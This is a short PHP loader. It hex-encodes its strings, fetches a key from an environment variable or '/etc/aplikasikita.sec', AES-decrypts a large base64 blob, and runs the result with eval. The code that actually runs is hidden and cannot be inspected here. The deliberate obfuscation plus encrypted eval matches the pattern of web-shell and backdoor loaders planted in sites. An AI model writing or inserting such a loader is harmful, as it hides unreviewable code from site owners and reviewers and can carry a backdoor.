<?php

$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('iEsy6F8vIAZ45W31oMkRYw==');

$c=base64_decode(

'G2/UVHeb6D0Y0jy/qAiGmovODdJdZ4y4+sm7mv9ITkNAWNv5tpkZ24GhYOUO+el572Bfm3StIAX4' .
'7YxezjfvdcT2iPFsE/DRjGBEhNxtnIIMz+9tcGTbGQB+WYl5nASL15GPQoQjGql13XBo8fotCSzn' .
'BEI7bd/ISC1SStdNOBEz7FQ+29M0zqoXmc8EiPojI41jbnptYpeJpbJH3hTSuKRHW2/ZRwJtsuSv' .
'nLnv4SvylP0PAHfuD5XP8WoTBL58R+qjJ5mI7qS1hD6UHk+1ReUtUL79IxMJFJpIVRZx4jgBoQfC' .
'Pae/eFxY1kQftCWrnixA1vi3QONAdXUHEjfvRBesDTAnQaw5N7ekC+R5Y57TobwEVVmi3qiAEuse' .
'JXItau10yeLYbViTp/Q9p9ptcD6zrBuJ4wXtBPJ9os3iJvb0kxhihoJ0WHYIlodptERvMhaodgFz' .
'NDxRIrafeGlg0Mj6ZWeXa50ncOOb2gjXc/E7WuKBdqkWdbI+6hc4k46oWyIR/ucRj380pocrpHFs' .
'oZ0d8DQSiKs1DXtUrAwyDPtJK1NNPP2g1T79vYoK3rs6FGcLxGnZpSrewbgMPrYFUilPmRnCugmw' .
'f6fYXFubDo+/tH1fxh9/NqKl6DinolH5KRf57EEluJLWCSE5wsYQciibYyyk8uMloQviDCuvNz3o' .
'XctIChGATgofpEjVq9lhfLuwW4Dm8KKvhuNMyDJb7h3iuyfVd/jRT1+ZDYECyCfI+C+clJ0GmkBM' .
'3ThQ+k272CNFtk4+Thc+oFYWU8DPsbiwgVZ5fyhyNK5c3+sqZGYyJbGfD9m/WsXRzgI+OpCeutkD' .
'wFUTs3y3U1EPT8GLam0SeRbOTB9JWqZ6XgI6tWXsbQXMcSeF5ufJ2sRzxWkRlELh7O0saBzPDA3+' .
'9EcF6pbl5FpJ+/KYf5nBCELfidliYW5o+40u3eCdhFjfUJZy55mvlZt9bTxeJaTpF+xi3CTFTIbI' .
'Lf64iczSbJenYinB4FOzZrXprWLEKwgL/RUGVaCfbLl265WaL5nXH1XsO9Cg5d31GoV5y2F3AoOx' .
'/9GZkAqJpG7G7ufUX1TdNq3EBa199t+aUl+c/8qrgsRl5MpT2CntKmemdp4xFyetDqxQfq8Dw7lq' .
'D+cq+GSo6Mh8Dkfn3OK3DeV9S6yRfh1Azs5Zv1lY+ED407z3Fc56iHS1Fx10lsqRmNWGzmcAPQwJ' .
'XfDBBLWOtJ+P9QLAkz9TKHqb0oYkApf8us8JVmZB9URKNNhs0tVHQX0SNWAyEUymZDN8BH/avehL' .
'vHY4T4Z/+aZrt43iXb7ZOjUnERZqO8MuvoIfXlX3h8nUzFFy2PUD5GVD/3e+u57P5mPEpZJ3Nkz8' .
'iWfZYwoz3Q+hSjkur+XrMc43CbCbu9z4qgKJywBaxV8fuo62XF4ue/TmAmXDyCPL+L32kGmQX5e1' .
'ZjGsKAm+98dOQ/zenaKX5+BwS8BGtKvOIJUVsWdatdspn7h56XVdWY12z39q6qfBoCWOtHsicCCm' .
'Mdd5f1BDPYSyKSFqP8ZkyJLGyGrwd7QHbyaIr+sFyJiVwjAsbsz9l1/LCK+PKWyaw7efNqRBLI1D' .
'fzWbQR0tb2TC6YzzggEWvwj1jD/ex8PCLfZDAfh9H8osXxU0HJeShMiq3DNjfVRoYX+qrH7vcgfn' .
'xM9VRuc2oP45pafvw1tYzn71AiAyRdhesK8XAbmSs2w6J13zeD1QMfmhhAbKw5/u5EV8Iz+aAUIq' .
'6DsPIf3NxFDTP1qroq3nZVZpLJyNb3B2B0+L3fMk3dHEUxtQ/EMPDMMRBMnK4PS7y0Km0yiriLhb' .
'WefNROI4oTOjPb/+3LwW2hRI4KP9X/UJ7Pe21aLXlupqKxTX016Vbk+RvXnll54pOn5GhDwrXPFs' .
'HwNqA1MbZEEvg+1quL+Pi5oeyuOGOooIdtJwgC6u8OxBOOE+czKkGT7MPKbzj3DwI2qDnDh98+Gi' .
'10nEDu1ryWPKzFqq2Tj29GSVWDn1GtuelTWh0Pgvt1w40hvtA2fXT/FBJUcvSpl/6ru/4/9J1fjz' .
'dr469PUt0nguG4Mk/y8DN9u9dhSrjcBlmHMOZN67u6esrU2WtCOzKysASArD4BlVdYjqqIAsxSph' .
'2qEQBosS4JYgjIjsaSznH2+/IqU0j8ojgoey3ksY58aNupRzNCz18F9iyITila3YPJcIhG/0diz9' .
'bNnE8Q4mhmOjYxMjbpdyc3APKTvg8tvIfMBwAHOhTdiGgEI+U1emP0hN+vQO7E01IIreFh6SvGTG' .
'5oEH2DtfcGmqZnilE2GD90Hh0feMJH95I9uFUdAtPWKZ4bs5eFfagshMGygkQxIYslwFjim2YFwx' .
'8v3b6jbjoA2bWHwLc4A3RmORADiagRrEtw=='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval('?>'.$d);

